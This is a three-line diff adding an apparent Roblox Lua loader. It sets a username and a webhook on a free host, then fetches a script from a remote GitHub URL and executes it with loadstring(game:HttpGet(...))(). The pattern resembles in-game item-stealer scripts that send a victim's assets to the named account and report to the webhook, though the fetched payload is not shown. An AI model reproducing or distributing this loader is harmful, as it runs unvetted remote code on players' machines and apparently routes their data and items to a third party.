@@ -1,0 +1,3 @@
+UserName = "fahad3ss4"
+WebHook = "https://webhookprotection.000webhostapp.com/db/3561324561563389074/index.php"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
